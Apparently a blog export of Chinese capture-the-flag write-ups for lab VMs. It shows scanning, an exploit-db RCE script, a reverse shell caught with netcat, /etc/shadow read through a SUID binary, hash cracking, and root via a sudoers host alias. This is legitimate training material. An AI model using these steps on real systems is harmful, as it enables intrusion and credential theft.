1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)\n192.168.205.1   00:50:56:c0:00:08       VMware, Inc.\n192.168.205.2   00:50:56:fc:94:2f       VMware, Inc.\n192.168.205.175 08:00:27:14:e1:21       PCS Systemtechnik GmbH\n192.168.205.254 00:50:56:fa:75:ed       VMware, Inc.\n\n4 packets received by filter, 0 packets dropped by kernel\nEnding arp-scan 1.10.0: 256 hosts scanned in 1.997 seconds (128.19 hosts/sec). 4 responded\n                                                                                                                                                                                  \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ nmap -p- 192.168.205.175\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-07-11 05:42 EDT\nNmap scan report for 192.168.205.175\nHost is up (0.00015s latency).\nNot shown: 65533 closed tcp ports (reset)\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\nMAC Address: 08:00:27:14:E1:21 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nNmap done: 1 IP address (1 host up) scanned in 1.25 seconds\n                       \n```\n\n\u770bweb\n\n![image-20250711174336944](https://7r1umphk.github.io/image/20250711174337092.webp)\n\n\u8df3\u8f6c\u4e0d\u8fc7\u53bb\uff0c\u62e6\u4e00\u4e0bjsdelivr\u7684\n\n![image-20250711174539493](https://7r1umphk.github.io/image/20250711174539834.webp)\n\n\u8df3\u8f6c\u5230\n\n![image-20250711174433367](https://7r1umphk.github.io/image/20250711174433533.webp)\n\nnuclei\u770b\u770b\u67b6\u6784\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ nuclei -u http://192.168.205.175/tinyfilemanager.php\n\n                     __     _\n   ____  __  _______/ /__  (_)\n  / __ \\/ / / / ___/ / _ \\/ /\n / / / / /_/ / /__/ /  __/ /\n/_/ /_/\\__,_/\\___/_/\\___/_/   v3.4.5\n\n                projectdiscovery.io\n\n[INF] Current nuclei version: v3.4.5 (outdated)\n[INF] Current nuclei-templates version: v10.2.4 (latest)\n[WRN] Scan results upload to cloud is disabled.\n[INF] New templates added in latest release: 67\n[INF] Templates loaded for current scan: 8150\n[INF] Executing 7946 signed templates from projectdiscovery/nuclei-templates\n[WRN] Loading 204 unsigned templates for scan. Use with caution.\n[INF] Targets loaded for current scan: 1\n[INF] Templates clustered: 1761 (Reduced 1653 Requests)\n[INF] Using Interactsh Server: oast.pro\n[cookies-without-httponly] [javascript] [info] 192.168.205.175 ['filemanager']\n[cookies-without-secure] [javascript] [info] 192.168.205.175 ['filemanager']\n[waf-detect:apachegeneric] [http] [info] http://192.168.205.175/tinyfilemanager.php\n[ssh-sha1-hmac-algo] [javascript] [info] 192.168.205.175:22\n[ssh-password-auth] [javascript] [info] 192.168.205.175:22\n[ssh-auth-methods] [javascript] [info] 192.168.205.175:22 ['['publickey','password']']\n[ssh-server-enumeration] [javascript] [info] 192.168.205.175:22 ['SSH-2.0-OpenSSH_8.4p1 Debian-5+deb11u3']\n[openssh-detect] [tcp] [info] 192.168.205.175:22 ['SSH-2.0-OpenSSH_8.4p1 Debian-5+deb11u3']\n[form-detection] [http] [info] http://192.168.205.175/tinyfilemanager.php\n[tiny-file-manager] [http] [info] http://192.168.205.175/tinyfilemanager.php/index.php\n[http-missing-security-headers:clear-site-data] [http] [info] http://192.168.205.175/tinyfilemanager.php\n[http-missing-security-headers:strict-transport-security] [http] [info] http://192.168.205.175/tinyfilemanager.php\n[http-missing-security-headers:content-security-policy] [http] [info] http://192.168.205.175/tinyfilemanager.php\n[http-missing-security-headers:x-frame-options] [http] [info] http://192.168.205.175/tinyfilemanager.php\n[http-missing-security-headers:x-content-type-options] [http] [info] http://192.168.205.175/tinyfilemanager.php\n[http-missing-security-headers:cross-origin-embedder-policy] [http] [info] http://192.168.205.175/tinyfilemanager.php\n[http-missing-security-headers:cross-origin-opener-policy] [http] [info] http://192.168.205.175/tinyfilemanager.php\n[http-missing-security-headers:cross-origin-resource-policy] [http] [info] http://192.168.205.175/tinyfilemanager.php\n[http-missing-security-headers:permissions-policy] [http] [info] http://192.168.205.175/tinyfilemanager.php\n[http-missing-security-headers:x-permitted-cross-domain-policies] [http] [info] http://192.168.205.175/tinyfilemanager.php\n[http-missing-security-headers:referrer-policy] [http] [info] http://192.168.205.175/tinyfilemanager.php\n[tech-detect:jsdelivr] [http] [info] http://192.168.205.175/tinyfilemanager.php\n[tech-detect:bootstrap] [http] [info] http://192.168.205.175/tinyfilemanager.php\n[apache-detect] [http] [info] http://192.168.205.175/tinyfilemanager.php ['Apache/2.4.62 (Debian)']\n[INF] Scan completed in 1m. 24 matches found.\n                          \n```\n\n\u641c\u4e00\u4e0b\u6709\u6ca1\u6709\u6d1e\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ searchsploit tiny file manager\n------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------\n Exploit Title                                                                                                                                  |  Path\n------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------\nManx 1.0.1 - '/admin/tiny_mce/plugins/ajaxfilemanager/ajax_get_file_listing.php' Multiple Cross-Site Scripting Vulnerabilities                  | php/webapps/36364.txt\nManx 1.0.1 - '/admin/tiny_mce/plugins/ajaxfilemanager_OLD/ajax_get_file_listing.php' Multiple Cross-Site Scripting Vulnerabilities              | php/webapps/36365.txt\nMCFileManager Plugin for TinyMCE 3.2.2.3 - Arbitrary File Upload                                                                                | php/webapps/15768.txt\nTiny File Manager 2.4.6 - Remote Code Execution (RCE)                                                                                           | php/webapps/50828.sh\nTinyMCE MCFileManager 2.1.2 - Arbitrary File Upload                                                                                             | php/webapps/15194.txt\n------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------\nShellcodes: No Results\n                                                                                                                                                                                  \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ cd tmp                        \n                                                                                                                                                                                  \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ searchsploit -m php/webapps/50828.sh\n  Exploit: Tiny File Manager 2.4.6 - Remote Code Execution (RCE)\n      URL: https://www.exploit-db.com/exploits/50828\n     Path: /usr/share/exploitdb/exploits/php/webapps/50828.sh\n    Codes: CVE-2021-45010, CVE-2021-40964\n Verified: False\nFile Type: Unicode text, UTF-8 text\nCopied to: /mnt/hgfs/gx/x/tmp/50828.sh\n\n\n                                                                                                                                                                                  \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ bash /mnt/hgfs/gx/x/tmp/50828.sh\n\nTIny File Manager Authenticated RCE Exploit.\n\nBy FEBIN\n\n/mnt/hgfs/gx/x/tmp/50828.sh <URL> <Admin Username> <Password>\n\nExample: /mnt/hgfs/gx/x/tmp/50828.sh http://files.ubuntu.local/index.php admin 'admin@123'\n\n                                                                                                                                                                                  \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ bash /mnt/hgfs/gx/x/tmp/50828.sh http://192.168.205.175/tinyfilemanager.php admin 'admin@123'\n/usr/bin/curl\n[\u2714] Curl found! \n/usr/bin/jq\n[\u2714] jq found! \n\n[+]  Login Success! Cookie: filemanager=70k14rakb4d73nos0gib5frd7d \njq: parse error: Invalid numeric literal at line 1, column 14\n[-] Can't find WEBROOT! Using default /var/www/html \n[-] File Upload Unsuccessful! Exiting! \n                                           \n```\n\n\u5931\u8d25\uff0c\u4f46\u662f\u9ed8\u8ba4\u5bc6\u7801\u767b\u5f55\u6210\u529f\u4e86\uff0c\u6240\u4ee5\u6211\u4eec\u53bbweb\u81ea\u5df1\u4e0a\u4f20\n\n![image-20250711175333897](https://7r1umphk.github.io/image/20250711175334236.webp)\n\n\u6210\u4e86\uff0c\u4ec0\u4e48\u9650\u5236\u90fd\u6ca1\u6709\uff0c\u76f4\u63a5\u8bbf\u95ee\uff0c\u62ffshell\uff08\u8fd9\u4e2a\u67b6\u6784\u3002\u7fa4\u4e3b\u597d\u50cf\u6253\u8fc7\uff09\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ nc -lnvp 8888                                       \nlistening on [any] 8888 ...\n\n```\n\n![image-20250711175447900](https://7r1umphk.github.io/image/20250711175448104.webp)\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ nc -lnvp 8888                                       \nlistening on [any] 8888 ...\nconnect to [192.168.205.128] from (UNKNOWN) [192.168.205.175] 55696\nLinux Sudo 4.19.0-27-amd64 #1 SMP Debian 4.19.316-1 (2024-06-25) x86_64 GNU/Linux\n 05:54:36 up 12 min,  0 users,  load average: 0.40, 4.74, 3.31\nUSER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\nbash: cannot set terminal process group (414): Inappropriate ioctl for device\nbash: no job control in this shell\nwww-data@Sudo:/$ id\nid\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\nwww-data@Sudo:/$ cd /h\ncd /home/\nwww-data@Sudo:/home$ ls -al\nls -al\ntotal 12\ndrwxr-xr-x  3 root  root  4096 Jul  9 04:41 .\ndrwxr-xr-x 18 root  root  4096 Mar 18 20:37 ..\ndrwxr-xr-x  2 eecho eecho 4096 Jul  9 04:42 eecho\nwww-data@Sudo:/home$ cd ee\ncd eecho/\nwww-data@Sudo:/home/eecho$ ls -al\nls -al\ntotal 24\ndrwxr-xr-x 2 eecho eecho 4096 Jul  9 04:42 .\ndrwxr-xr-x 3 root  root  4096 Jul  9 04:41 ..\nlrwxrwxrwx 1 root  root     9 Jul  9 04:42 .bash_history -> /dev/null\n-rw-r--r-- 1 eecho eecho  220 Jul  9 04:41 .bash_logout\n-rw-r--r-- 1 eecho eecho 3526 Jul  9 04:41 .bashrc\n-rw-r--r-- 1 eecho eecho  807 Jul  9 04:41 .profile\n-rw-r--r-- 1 root  root    44 Jul  9 04:42 user.txt\nwww-data@Sudo:/home/eecho$ su eecho\nsu eecho\nPassword: eecho\nsu: Authentication failure\nwww-data@Sudo:/home/eecho$ cat user.txt\ncat user.txt\nflag{user-e1930b4927e6b6d92d120c7c1bba3421}\nwww-data@Sudo:/home/eecho$ cd /opt \ncd /opt\nwww-data@Sudo:/opt$ ls -al\nls -al\ntotal 8\ndrwxr-xr-x  2 root root 4096 Apr  1 08:59 .\ndrwxr-xr-x 18 root root 4096 Mar 18 20:37 ..\nwww-data@Sudo:/opt$ find / -perm -4000 -type f 2>/dev/null\nfind / -perm -4000 -type f 2>/dev/null\n/usr/bin/chsh\n/usr/bin/read_file\n/usr/bin/chfn\n/usr/bin/newgrp\n/usr/bin/gpasswd\n/usr/bin/mount\n/usr/bin/su\n/usr/bin/umount\n/usr/bin/pkexec\n/usr/bin/sudo\n/usr/bin/passwd\n/usr/lib/dbus-1.0/dbus-daemon-launch-helper\n/usr/lib/eject/dmcrypt-get-device\n/usr/lib/openssh/ssh-keysign\n/usr/libexec/polkit-agent-helper-1\n```\n\n/usr/bin/read_file\n\n```\nwww-data@Sudo:/opt$ ls -al /usr/bin/read_file\nls -al /usr/bin/read_file\n-rwsr-sr-x 1 root root 17528 Jul  9 05:01 /usr/bin/read_file\nwww-data@Sudo:/opt$ strings /usr/bin/read_file\nstrings /usr/bin/read_file\n/lib64/ld-linux-x86-64.so.2\n4hhl\nstrncmp\nperror\nputs\nprintf\nstrlen\nread\ngetopt\nrealpath\noptarg\nstderr\nfwrite\nclose\nopen\n__cxa_finalize\n__libc_start_main\n__xstat\n__lxstat\nlibc.so.6\nGLIBC_2.3\nGLIBC_2.2.5\n_ITM_deregisterTMCloneTable\n__gmon_start__\n_ITM_registerTMCloneTable\nu/UH\nhu)H\n[]A\\A]A^A_\nUsage: %s -f <filepath>\nOptions:\n  -h         Show this help message\n  -f <file>  Specify the file to view (must be under /etc)\nSecurity restrictions:\n  - File path must start with /etc/\n  - Symbolic links and path traversal are blocked\n  - Only regular files can be read\n/etc/\nError: No arguments provided\nError: No file specified\nError: Path must start with /etc/\nError resolving path\nError: Resolved path is not under /etc/\nError checking file status\nError: Symbolic links are not allowed\nError checking resolved file\nError: Only regular files are allowed\nError opening file\nError reading file\nError writing to stdout\n;*3$'\nGCC: (Debian 10.2.1-6) 10.2.1 20210110\ncrtstuff.c\nderegister_tm_clones\n__do_global_dtors_aux\ncompleted.0\n__do_global_dtors_aux_fini_array_entry\nframe_dummy\n__frame_dummy_init_array_entry\nread_file.c\n__FRAME_END__\n__init_array_end\n_DYNAMIC\n__init_array_start\n__GNU_EH_FRAME_HDR\n_GLOBAL_OFFSET_TABLE_\n__libc_csu_fini\n__stat\nstrncmp@GLIBC_2.2.5\n_ITM_deregisterTMCloneTable\nputs@GLIBC_2.2.5\n_edata\nstrlen@GLIBC_2.2.5\n__lxstat@GLIBC_2.2.5\nprintf@GLIBC_2.2.5\nclose@GLIBC_2.2.5\nread@GLIBC_2.2.5\n__libc_start_main@GLIBC_2.2.5\n__data_start\nis_etc_directory\noptarg@GLIBC_2.2.5\n__gmon_start__\n__dso_handle\nrealpath@GLIBC_2.3\n_IO_stdin_used\n__xstat@GLIBC_2.2.5\n__libc_csu_init\n__bss_start\nmain\n__lstat\nopen@GLIBC_2.2.5\nperror@GLIBC_2.2.5\ngetopt@GLIBC_2.2.5\nprint_help\nfwrite@GLIBC_2.2.5\n__TMC_END__\n_ITM_registerTMCloneTable\n__cxa_finalize@GLIBC_2.2.5\nstderr@GLIBC_2.2.5\n.symtab\n.strtab\n.shstrtab\n.interp\n.note.gnu.build-id\n.note.ABI-tag\n.gnu.hash\n.dynsym\n.dynstr\n.gnu.version\n.gnu.version_r\n.rela.dyn\n.rela.plt\n.init\n.plt.got\n.text\n.fini\n.rodata\n.eh_frame_hdr\n.eh_frame\n.init_array\n.fini_array\n.dynamic\n.got.plt\n.data\n.bss\n.comment\n```\n\n\u8fd8\u6709\u5e2e\u52a9\u6587\u6863\uff0c\u4e0d\u9519\u4e0d\u9519\n\n```\nwww-data@Sudo:/opt$ /usr/bin/read_file -f /etc/shadow\n/usr/bin/read_file -f /etc/shadow\nroot:$y$j9T$8u7tw.ivXZkGdXyV0Fs.d/$FfzoOYYu8sRq7K2smsiRh5UGsVU2mI8.Q3Vmk0VtzUA:20190:0:99999:7:::\ndaemon:*:20166:0:99999:7:::\nbin:*:20166:0:99999:7:::\nsys:*:20166:0:99999:7:::\nsync:*:20166:0:99999:7:::\ngames:*:20166:0:99999:7:::\nman:*:20166:0:99999:7:::\nlp:*:20166:0:99999:7:::\nmail:*:20166:0:99999:7:::\nnews:*:20166:0:99999:7:::\nuucp:*:20166:0:99999:7:::\nproxy:*:20166:0:99999:7:::\nwww-data:*:20166:0:99999:7:::\nbackup:*:20166:0:99999:7:::\nlist:*:20166:0:99999:7:::\nirc:*:20166:0:99999:7:::\ngnats:*:20166:0:99999:7:::\nnobody:*:20166:0:99999:7:::\n_apt:*:20166:0:99999:7:::\nsystemd-timesync:*:20166:0:99999:7:::\nsystemd-network:*:20166:0:99999:7:::\nsystemd-resolve:*:20166:0:99999:7:::\nsystemd-coredump:!!:20166::::::\nmessagebus:*:20166:0:99999:7:::\nsshd:*:20166:0:99999:7:::\neecho:$6$mL.9/fVsBqItNR..$GyJfKOjLcovjApxygZ79CjKcqJmJ37jC8y9KeLq81fLAnNCYVP1Nw9d8Dp9pZi/l3CWJ3PHL1l/Hld3sFmZoQ.:20278:0:99999:7:::\n```\n\n\u7206\u51fa\u4e86\u4e00\u4e2aeecho\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ john --wordlist=/usr/share/wordlists/rockyou.txt hash \nWarning: detected hash type 'sha512crypt', but the string is also recognized as 'HMAC-SHA256'\nUse the '--format=HMAC-SHA256' option to force loading these as that type instead\nWarning: detected hash type 'sha512crypt', but the string is also recognized as 'HMAC-SHA512'\nUse the '--format=HMAC-SHA512' option to force loading these as that type instead\nUsing default input encoding: UTF-8\nLoaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 512/512 AVX512BW 8x])\nCost 1 (iteration count) is 5000 for all loaded hashes\nWill run 8 OpenMP threads\nPress 'q' or Ctrl-C to abort, almost any other key for status\nalexis15         (eecho)     \n1g 0:00:00:01 DONE (2025-07-11 06:00) 0.5263g/s 26947p/s 26947c/s 26947C/s truckin..choccy\nUse the '--show' option to display all of the cracked passwords reliably\nSession completed. \n                                                                                                                                                                                  \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ cat hash\neecho:$6$mL.9/fVsBqItNR..$GyJfKOjLcovjApxygZ79CjKcqJmJ37jC8y9KeLq81fLAnNCYVP1Nw9d8Dp9pZi/l3CWJ3PHL1l/Hld3sFmZoQ.\n             \n```\n\n\u767b\u5f55\n\n```\nwww-data@Sudo:/opt$ su eecho\nsu eecho\nPassword: alexis15\nid\nuid=1000(eecho) gid=1000(eecho) groups=1000(eecho)\necho $0\nbash\n```\n\n\u7a33\u56fa\n\n```\nscript /dev/null -c bash\nCtrl+Z\nstty raw -echo; fg\nreset xterm  \nexport TERM=xterm  \nexport SHELL=/bin/bash  \nstty rows 24 columns 80\n```\n\n\u770b\u770b\u6709\u6ca1\u6709\u4fe1\u606f\n\n```\neecho@Sudo:~$ ls -al\ntotal 24\ndrwxr-xr-x 2 eecho eecho 4096 Jul  9 04:42 .\ndrwxr-xr-x 3 root  root  4096 Jul  9 04:41 ..\nlrwxrwxrwx 1 root  root     9 Jul  9 04:42 .bash_history -> /dev/null\n-rw-r--r-- 1 eecho eecho  220 Jul  9 04:41 .bash_logout\n-rw-r--r-- 1 eecho eecho 3526 Jul  9 04:41 .bashrc\n-rw-r--r-- 1 eecho eecho  807 Jul  9 04:41 .profile\n-rw-r--r-- 1 root  root    44 Jul  9 04:42 user.txt\neecho@Sudo:~$ sudo -l\n\nWe trust you have received the usual lecture from the local System\nAdministrator. It usually boils down to these three things:\n\n    #1) Respect the privacy of others.\n    #2) Think before you type.\n    #3) With great power comes great responsibility.\n\n[sudo] password for eecho: \nSorry, user eecho may not run sudo on Sudo.\n```\n\n\u554a\u8fd9\uff0c\u6211\u8fd8\u4ee5\u4e3a\u51fasudo\u9898\u5462\uff0c\u4e0d\u662f\u90a3\u5c31\u662fread\u90a3\u4e2a\u6709\u95ee\u9898\n\u5c45\u7136\u9776\u673a\u53ebsudo\uff0c\u4e0d\u662fsudo -l\uff0c\u90a3\u4f1a\u4e0d\u4f1a\u662f/etc/sudoers\u6709\u95ee\u9898\n\n\u770b\u770b\n\n```\neecho@Sudo:~$ /usr/bin/read_file -f /etc/sudoers\n#\n# This file MUST be edited with the 'visudo' command as root.\n#\n# Please consider adding local content in /etc/sudoers.d/ instead of\n# directly modifying this file.\n#\n# See the man page for details on how to write a sudoers file.\n#\nDefaults        env_reset\nDefaults        mail_badpass\nDefaults        secure_path='/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin'\n\n# Host alias specification\n\n# User alias specification\n\n# Cmnd alias specification\n\n# User privilege specification\nroot    ALL=(ALL:ALL) ALL\n\n# Allow members of group sudo to execute any command\n%sudo   ALL=(ALL:ALL) ALL\neecho Dashazi = NOPASSWD:ALL\n# See sudoers(5) for more information on '@include' directives:\n\n@includedir /etc/sudoers.d\n```\n\n\u8fd8\u771f\u662f\n\n\u5b83\u9700\u8981Dashazi\u7684\u4e3b\u673a\u522b\u540d\u624d\u751f\u6548\n\n```\neecho@Sudo:~$ hostname\nSudo\neecho@Sudo:~$ sudo -h Dashazi /bin/bash\nsudo: unable to resolve host Dashazi: Name or service not known\nroot@Sudo:/home/eecho# id\nuid=0(root) gid=0(root) groups=0(root)\nroot@Sudo:/home/eecho# cat /root/root.txt \nflag{root}\n```\n\nsentence", "top": 0, "createdAt": 1752240735, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-07-11", "dateLabelColor": "#0969da"}, "P139": {"htmlDir": "docs/post/nei-bu-_5ud0.html", "labels": ["\u5185\u90e8\u9776\u673a/maze-sec"], "postTitle": "\u5185\u90e8_5ud0", "postUrl": "post/nei-bu-_5ud0.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/139", "commentNum": 0, "wordCount": 12566, "description": "![image-20250715211044032](https://7r1umphk.github.io/image/20250715211044343.webp)\n\n\u8fd9\u4e2a\u6253\u5b8c\u4e86\uff0c\u8865\u4e2awp\n\n> [!Tip]\n>\n> \u7fa4\u91cc\u641e\u4e86\u4e00\u4e2a\u6211\u4eec\u81ea\u5df1\u9776\u673a\u7684wp\u4ed3\u5e93\uff0c\u611f\u5174\u8da3\u7684\u53ef\u4ee5\u770b\u4e00\u4e0b\n> https://github.com/hyhforevertop/Mazesec-writeups\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ sudo arp-scan -l                                       \n[sudo] kali \u7684\u5bc6\u7801\uff1a\nInterface: eth0, type: EN10MB, MAC: 00:0c:29:57:e5:45, IPv4: 192.168.205.128\nStarting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)\n192.168.205.1   00:50:56:c0:00:08       VMware, Inc.\n192.168.205.2   00:50:56:fc:94:2f       VMware, Inc.\n192.168.205.185 08:00:27:8e:cd:d9       PCS Systemtechnik GmbH\n192.168.205.254 00:50:56:fb:d6:c6       VMware, Inc.\n\n4 packets received by filter, 0 packets dropped by kernel\nEnding arp-scan 1.10.0: 256 hosts scanned in 1.954 seconds (131.01 hosts/sec). 4 responded\n                                                                                     \n```\n\n192.168.205.185\n\n\u63a2\u6d4b\u670d\u52a1\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ nmap -p- 192.168.205.185  \nStarting Nmap 7.95 ( https://nmap.org ) at 2025-07-15 09:11 EDT\nNmap scan report for 192.168.205.185\nHost is up (0.00013s latency).\nNot shown: 65533 closed tcp ports (reset)\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\nMAC Address: 08:00:27:8E:CD:D9 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nNmap done: 1 IP address (1 host up) scanned in 1.42 seconds\n                                                                       \n```\n\n\u770bweb\n\n![image-20250715211201958](https://7r1umphk.github.io/image/20250715211202294.webp)\n\n\u968f\u4fbf\u70b9\u4e2a\u8d85\u94fe\u63a5\u53d1\u73b0\u8df3\u8f6ctextpattern.dsz\n\n\u52a0\u4e2ahosts\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ sudo vim /etc/hosts                                                                            \n                                                                                                                                                                                  \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ tail -n 1 /etc/hosts                     \n192.168.205.185 textpattern.dsz\n                              \n```\n\n![image-20250715211441278](https://7r1umphk.github.io/image/20250715211441521.webp)\n\n\u76ee\u5f55\u7206\u7834\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ gobuster dir -u http://textpattern.dsz/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  -x php,txt,html,zip -t 64\n===============================================================\nGobuster v3.6\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://textpattern.dsz/\n[+] Method:                  GET\n[+] Threads:                 64\n[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt\n[+] Negative Status codes:   404\n[+] User Agent:              gobuster/3.6\n[+] Extensions:              php,txt,html,zip\n[+] Timeout:                 10s\n===============================================================\nStarting gobuster in directory enumeration mode\n===============================================================\n/.html                (Status: 403) [Size: 280]\n/files                (Status: 301) [Size: 318] [--> http://textpattern.dsz/files/]\n/images               (Status: 301) [Size: 319] [--> http://textpattern.dsz/images/]\n/themes               (Status: 301) [Size: 319] [--> http://textpattern.dsz/themes/]\n/index.php            (Status: 200) [Size: 11506]\n/sites                (Status: 301) [Size: 318] [--> http://textpattern.dsz/sites/]\n/css.php              (Status: 200) [Size: 0]\n/.php                 (Status: 403) [Size: 280]\n/README.txt           (Status: 200) [Size: 1152]\n/INSTALL.txt          (Status: 200) [Size: 3080]\n/LICENSE.txt          (Status: 200) [Size: 15170]\n/rpc                  (Status: 301) [Size: 316] [--> http://textpattern.dsz/rpc/]\nProgress: 45805 / 1102800 (4.15%)^C\n[!] Keyboard interrupt detected, terminating.\nProgress: 48835 / 1102800 (4.43%)\n===============================================================\nFinished\n===============================================================\n```\n\n\u6252\u62c9\u4e86\u4e00\u4e0b\uff0c\u5728README.txt\u770b\u5230\u4e86cms\u7684\u7248\u672c\u53f7\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ curl http://textpattern.dsz/README.txt                          \nTextpattern CMS 4.8.7\n\nReleased under the GNU General Public License.\nSee LICENSE.txt for terms and conditions.\n\nIncludes contributions licensed under the GNU Lesser General Public License.\nSee textpattern/lib/LICENSE-LESSER.txt for terms and conditions.\n\nIncludes contributions licensed under the New BSD License.\nSee textpattern/lib/LICENSE-BSD-3.txt for terms and conditions.\n\n\n== About ==\n\nTextpattern CMS is a flexible, elegant and easy-to-use content management\nsystem. Textpattern is free and open source.\n\n\n== Installing Textpattern ==\n\n* Refer to INSTALL.txt for details.\n\n\n== Upgrading Textpattern ==\n\n* Refer to UPGRADE.txt for details.\n\n\n== Resources ==\n\n* Website:       https://textpattern.com/\n* Support forum: https://forum.textpattern.com\n* Documentation: https://docs.textpattern.com\n\n* Social:        https://textpattern.com/twitter\n\n* Development:   https://textpattern.com/github\n* Contributing:  https://docs.textpattern.com/development/contributing\n\n* Sponsor:       https://github.com/sponsors/textpattern\n                 https://opencollective.com/textpattern-collective\n* Donate:        https://textpattern.com/about/patrons\n                                                  \n```\n\nTextpattern CMS 4.8.7\uff0cgoogle\u4e86\u4e00\u4e0b\uff0c\u770b\u5230\u4e86\u4e00\u4e2a\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u548c\u4e0a\u4f20\u6f0f\u6d1e\uff0c\u6240\u4ee5\u8fd8\u662f\u9700\u8981\u7206\u7834\u4e00\u4e0b\u7528\u6237\u5bc6\u7801\n![image-20250715211701681](https://7r1umphk.github.io/image/20250715211701938.webp)\n\n\u70b9\u8fd9\u91cc\u4f1a\u8df3\u8f6c\u767b\u5f55\u6216\u8005\u8bbf\u95ee    http://textpattern.dsz/textpattern/\n\n\u968f\u4fbf\u8f93\u5165\u70b9\u6293\u5305\n\n![image-20250715211818852](https://7r1umphk.github.io/image/20250715211819190.webp)\n\n\u53ea\u53ef\u4ee5\u786c\u7206\uff0c\u5de8\u6162\n\n![image-20250715212036753](https://7r1umphk.github.io/image/20250715212037141.webp)\n\n![image-20250715212123475](https://7r1umphk.github.io/image/20250715212123818.webp)\n\n\u5bc6\u7801\u5c31rockyou.txt\uff0c\u4e0d\u622a\u56fe\u4e86\n\n\u7136\u540e\u5f00\u542f\uff0c\u7b49\u5c31\u597d\u4e86\n\n![image-20250715212254371](https://7r1umphk.github.io/image/20250715212254743.webp)\n\nadmin:superman\n\n![image-20250715212344044](https://7r1umphk.github.io/image/20250715212344398.webp)\n\n\u4e0a\u4f20\u4e00\u4e2areverse.php\u4e0a\u53bb\u5c31\u597d\u4e86\n\nkali\u76d1\u542c\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ nc -lvnp 8888           \nlistening on [any] 8888 ...\n```\n\n![image-20250715212430424](https://7r1umphk.github.io/image/20250715212430750.webp)\n\n\u53bbhttp://textpattern.dsz/files/\n\n![image-20250715212454872](https://7r1umphk.github.io/image/20250715212455203.webp)\n\n\u70b9\u51fb\uff0c\u8f6c\u5708\u5708\n\n\u56de\u53bb\u770b\u76d1\u542c\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ nc -lvnp 8888           \nlistening on [any] 8888 ...\nconnect to [192.168.205.128] from (UNKNOWN) [192.168.205.185] 38534\nLinux 5ud0 4.19.0-27-amd64 #1 SMP Debian 4.19.316-1 (2024-06-25) x86_64 GNU/Linux\n 09:24:54 up 14 min,  0 users,  load average: 0.00, 0.03, 0.00\nUSER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\nbash: cannot set terminal process group (500): Inappropriate ioctl for device\nbash: no job control in this shell\nwww-data@5ud0:/$ ls /home\nls /home\ntodd\nwww-data@5ud0:/$ su todd\nsu todd\nPassword: todd\nsu: Authentication failure\nwww-data@5ud0:/$ ls -la /opt\nls -la /opt\ntotal 8\ndrwxr-xr-x  2 root root 4096 Jul  9 21:31 .\ndrwxr-xr-x 18 root root 4096 Jul 10 04:36 ..\nwww-data@5ud0:/$ find / -perm -4000 -type f 2>/dev/null\nfind / -perm -4000 -type f 